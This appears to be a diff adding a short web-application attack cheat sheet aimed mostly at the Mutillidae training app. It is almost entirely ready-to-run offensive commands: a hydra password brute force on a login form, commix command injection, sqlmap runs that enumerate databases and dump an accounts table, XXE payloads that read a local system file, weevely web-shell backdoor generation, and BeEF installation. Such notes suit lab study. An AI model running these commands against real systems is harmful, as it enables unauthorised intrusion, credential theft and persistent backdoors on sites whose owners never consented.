@@ -1,0 +1,31 @@
+sudo wpscan –-url <website.com>
+sudo httrack http://targetwebapp/ -O outputfolder
+hydra -l admin -P <Yourpasswordlist> 10.10.10.100 http-post-form “/mutillidae/index.php page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Not Logged In”Injection
+commix --url=http://YourIP/mutillidae/index.php popupnotificationcode=5L5&page=dns-lookup.php --data=”target_host=INJECT_HERE” -headers=”Accept-Language:fr\n ETAG:123\n”
+sqlmap -u ‘http://targetip/mutillidae/index.php?page=user-  info.php&username=admin&password=&user-info-php-submit-button=View+Account+Details’ --dbs
+sqlmap -u “http://yourip/mutillidae/index.php?page=user-info.php&username=&password=&user-info-php-submit-button=View+Account+Details” -D mutillidae --tables
+sqlmap -u “http://yourip/mutillidae/index.php?page=user-info.php&username=&password=&user-info-php-submit-button=View+Account+Details”-D mutillidae -T accounts --dump
+
+#XML Entity injection 
+  <!DOCTYPE foo [ <!ENTITY Variable “hello” >
+  ]><somexml><message>&Variable;</message></somexml>
+  
+  <!DOCTYPE foo [ <!ENTITY testref SYSTEM “file:///c:/windows/win.ini”> ]>
+   <somexml><message>&testref;</message></somexml>
+   
+#Backdoor
+
+sudo weevely generate <password> <path>
+
+#Beef
+git clone https://github.com/beefproject/beef
+cd beef
+sudo ./install
+<If install fails, add below to your sources /etc/apt/sources.lst>
+    deb http://http.kali.org/kali kali-last-snapshot main non-free contrib
+    deb http://http.kali.org/kali kali-experimental main non-free contrib
+    deb-src http://http.kali.org/kali kali-rolling main non-free contrib
+  
+  
+ 
+ 
